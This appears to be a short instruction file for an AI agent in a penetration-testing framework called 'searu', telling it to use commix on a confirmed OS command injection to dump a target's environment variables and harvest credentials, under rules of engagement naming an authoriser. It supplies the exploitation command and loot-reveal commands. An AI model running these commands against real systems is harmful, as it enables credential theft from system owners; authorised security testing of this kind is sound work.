---
model: haiku
---

# commix — unsecured credentials via the foothold (T1552)

Read credentials from the environment through a confirmed OS command injection. Exploitation tier —
the ROE must allow-list T1552 and name an authoriser.

    searu run commix --technique T1552 --target "http://host:port/path?param=1" -- --os-cmd env

Secrets in the output (e.g. `DATABASE_URL=…`, connection strings) are captured as loot; the finding
keeps only their fingerprint, never the value. Read them:

    searu loot --reveal
    searu findings --technique T1552

Report which credentials/secrets were recovered, by category — not the raw environment dump. See
`searu tool advice commix` for detail.
